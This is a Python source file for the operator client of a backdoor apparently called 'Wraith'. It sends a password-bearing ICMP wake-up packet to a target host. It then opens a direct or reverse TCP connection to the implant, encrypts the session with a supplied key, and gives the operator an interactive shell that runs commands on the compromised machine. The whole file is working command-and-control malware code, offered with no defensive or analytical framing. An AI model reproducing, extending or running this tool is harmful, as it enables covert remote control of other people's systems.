#!/bin/env python3

import argparse
import os
import random
import readline
import shlex
import socket
import struct
import sys
import time

from threading import Thread
from wraith import prettyconsole
from wraith.cmd import register_commands
from wraith.icmpclient import IcmpClient
from wraith.s20client import S20Client


class WraithShell:

    def __init__(self, client):
        self._client = client
        self._commands = {}
        register_commands(self)

    def add_command(self, name, handler):
        self._commands[name] = handler

    def display_help(self):
        print("Available builtins: " + ", ".join(self._commands.keys()))

    def repl(self):
        readline.parse_and_bind('tab: complete')
        while True:
            cmd = input("\001\x1B[0;32m\002>> \001\x1B[0m\002")

            if cmd.startswith("."):
                argv = shlex.split(cmd)
                name = argv[0][1:]

                if name in self._commands:
                    cmd_handler = self._commands[name]
                    cmd_handler(self._client, argv)
                elif name == "help":
                    self.display_help()
                else:
                    prettyconsole.print_error("No such builtin! Try .help for a list of builtins!")

            elif len(cmd.strip()) > 0:
                self.execute_remote_command(cmd)

    def execute_remote_command(self, cmd):
        self._client.send_command(1, 0, cmd.encode("utf-8"))

        while True:
            msg = self._client.recv_message()

            if msg.opcode != 0x10:
                break

            if msg.payload is not None:
                sys.stdout.buffer.write(msg.payload)

        sys.stdout.flush()


def tcp_connect(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    prettyconsole.print_info("Connecting to {0}:{1}".format(host, port))

    try:
        sock.connect((host, port))
    except ConnectionRefusedError:
        prettyconsole.print_error("Connection refused")
        raise SystemExit(-1)

    prettyconsole.print_success("Connection established!")

    return sock


def tcp_listen_once(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        prettyconsole.print_info("Listening on port {0}".format(port))

        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("0.0.0.0", port))
        listener.listen(1)

        sock, addr = listener.accept()

        prettyconsole.print_success("Accepted connection!")

        return sock


def send_wakeup_ping(target_ip, callback_ip, port, password, delay=0):
    icmp_client = IcmpClient(password)

    def wakeup(delay):
        time.sleep(delay)
        icmp_client.send_packet(target_ip, callback_ip, port)

    if callback_ip != "0.0.0.0":
        child_thread = Thread(target=wakeup, args=[10])
        child_thread.start()
    else:
        wakeup(0)


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("--password", "-P", required=False, help="Wake-up password")
    parser.add_argument("--callback", "-c", required=False, default="0.0.0.0", help="callback IP")
    parser.add_argument("--key", "-k", required=True, help="Session encryption key")
    parser.add_argument("--port", "-p", help="Listen port", default=0, type=int)

    parser.add_argument("ip", help="Target IP address")

    args = parser.parse_args()

    target_ip = args.ip
    keystr = args.key
    password = args.password
    port = args.port

    try:
        key = bytes.fromhex(keystr)
    except ValueError:
        prettyconsole.print_error("Invalid key specified")
        return

    if port == 0:
        port = random.randint(32768, 61000)

    if password:
        prettyconsole.print_success("Sent ICMP wake up command to {0}".format(target_ip))
        prettyconsole.print_info("Backdoor will listen on port {0}".format(port))
        send_wakeup_ping(target_ip, args.callback, port, password)

        sys.stdout.write("\nConnect in")

        for i in range(0, 4):
            sys.stdout.write(" " + str(4 - i))
            sys.stdout.flush()
            for j in range(0, 3):
                sys.stdout.write(".")
                sys.stdout.flush()
                time.sleep(.3)

        print("\n")
    
    client = S20Client(key)

    if args.callback == "0.0.0.0":
        client.wrap_socket(tcp_connect(target_ip, port))
    else:
        client.wrap_socket(tcp_listen_once(port))

    shell = WraithShell(client)

    prettyconsole.print_info("Entering interactive shell. Type .help for a list of builtins.")

    shell.repl()


if __name__ == "__main__":
    main()
